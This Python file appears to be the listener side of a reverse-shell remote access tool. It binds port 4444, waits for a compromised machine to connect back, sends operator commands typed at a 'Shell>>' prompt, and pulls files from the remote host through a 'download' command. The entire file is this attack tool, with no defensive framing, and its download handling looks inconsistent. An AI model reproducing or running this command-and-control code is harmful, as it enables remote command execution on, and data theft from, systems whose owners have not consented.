import socket
from colorama import Fore
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print(Fore.LIGHTYELLOW_EX + "[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(Fore.LIGHTGREEN_EX + "[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_receive_bytes(self, size):
        data = b""
        while len(data) < size:
            data += self.connection.recv(size - len(data))
        return data

    def ejec(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        elif command[0] == "download":
            metadata = self.reliable_receive()
            file_content = self.reliable_receive_bytes(metadata["size"])
            return file_content
        
        return self.reliable_receive()

    def escribir_archivo(self, archivo, contenido):
        try:
            with open(archivo, 'wb') as file:
                file.write(base64.b64decode(contenido))
            return f"Archivo {archivo} escrito exitosamente."
        except Exception as e:
            return f"Error al escribir el archivo: {str(e)}"

    def run(self):
        while True:
            command = input("Shell>> ").strip()  # Strip leading/trailing whitespace
            command_parts = command.split(" ")
            if command_parts[0] == "download":
                result = self.ejec(command_parts)
                mensaje = self.escribir_archivo(command_parts[1], result)
                print(mensaje)
            else:
                result = self.ejec(command_parts)
                print(result)

eschucha = Listener("", 4444)
eschucha.run()
